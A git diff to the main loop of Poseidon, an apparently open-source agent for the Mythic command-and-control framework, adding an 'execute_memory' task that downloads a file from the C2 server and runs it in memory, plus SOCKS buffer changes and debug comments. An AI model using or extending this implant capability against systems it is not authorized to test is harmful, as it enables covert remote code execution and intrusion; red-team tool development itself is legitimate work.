@@ -18,6 +18,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cp"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/curl"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/drives"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_memory"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getuser"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jxa"
@@ -198,6 +199,7 @@ func main() {
 		"socks":             36,
 		"listtasks":         37,
 		"list_entitlements": 38,
+		"execute_memory":    39,
 		"none":              NONE_CODE,
 	}
 
@@ -205,15 +207,17 @@ func main() {
 	backgroundTasks := make(map[string](chan []byte))
 	//if we have an Active apfell session, enter the tasking loop
 	if strings.Contains(checkIn.Status, "success") {
-		var fromMythicSocksChannel = make(chan structs.SocksMsg, 1000) // our channel for Socks
-		var toMythicSocksChannel = make(chan structs.SocksMsg, 1000)   // our channel for Socks
+		var fromMythicSocksChannel = make(chan structs.SocksMsg, 100) // our channel for Socks
+		var toMythicSocksChannel = make(chan structs.SocksMsg, 100)   // our channel for Socks
 	LOOP:
 		for {
-			//log.Println("sleeping")
+			//fmt.Println("sleeping")
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
 
 			// Get the next task
+			//fmt.Println("getting task")
 			t := profile.GetTasking()
+			//fmt.Println("got tasking")
 			task := t.(structs.TaskRequestMessageResponse)
 			/*
 				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
@@ -228,8 +232,10 @@ func main() {
 			sort.Slice(task.Tasks, func(i, j int) bool {
 				return task.Tasks[i].Timestamp < task.Tasks[j].Timestamp
 			})
+			//fmt.Println("sorted tasks")
 			// take any Socks messages and ship them off to the socks go routines
 			for j := 0; j < len(task.Socks); j++ {
+				//fmt.Println("sending data to fromMythicSocksChannel")
 				fromMythicSocksChannel <- task.Socks[j]
 			}
 			for j := 0; j < len(task.Tasks); j++ {
@@ -587,6 +593,15 @@ func main() {
 				case 38:
 					go list_entitlements.Run(task.Tasks[j])
 					break
+				case 39:
+					// File upload
+					var jsonArgs map[string]interface{}
+					json.Unmarshal([]byte(task.Tasks[j].Params), &jsonArgs)
+					backgroundTasks[jsonArgs["file_id"].(string)] = make(chan []byte)
+					go execute_memory.Run(task.Tasks[j], backgroundTasks[jsonArgs["file_id"].(string)], profile.GetFile)
+					//log.Println("Added to backgroundTasks with file id: ", fileDetails.FileID)
+					//go profile.GetFile(task.Tasks[j], fileDetails, backgroundTasks[fileDetails.FileID])
+					break
 				case NONE_CODE:
 					// No tasks, do nothing
 					break
@@ -597,7 +612,9 @@ func main() {
 
 			responseMsg := structs.TaskResponseMessage{}
 			responseMsg.Action = "post_response"
+			//fmt.Println("about to ask for getSocksChannelData")
 			responseMsg.Socks = getSocksChannelData(toMythicSocksChannel)
+			//fmt.Println("got getSocksChannelData with len", len(responseMsg.Socks))
 			if len(responseMsg.Socks) > 0 || len(profiles.TaskResponses) > 0 {
 				responseMsg.Responses = make([]json.RawMessage, 0)
 				responseMsg.Delegates = make([]json.RawMessage, 0)
@@ -632,6 +649,7 @@ func main() {
 				}
 
 			}
+			//fmt.Println("repeating big fetch loop")
 		}
 
 		// loop through all task responses before exiting
@@ -675,14 +693,16 @@ func main() {
 
 func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.SocksMsg {
 	var data = make([]structs.SocksMsg, 0)
+	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
 	for {
 		select {
+
 		case msg, ok := <-toMythicSocksChannel:
 			if ok {
-				//fmt.Printf("Value %d was read for post_response.\n", msg)
+				//fmt.Printf("Channel %d was read for post_response with length %d.\n", msg.ServerId, len(msg.Data))
 				data = append(data, msg)
 			} else {
-				//fmt.Println("Channel closed!")
+				//fmt.Println("Channel closed!\n")
 				return data
 			}
 		default:
@@ -690,4 +710,6 @@ func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.S
 			return data
 		}
 	}
+	//fmt.Printf("****- done fetching data from toMythicSocksChannel\n")
+	return data
 }
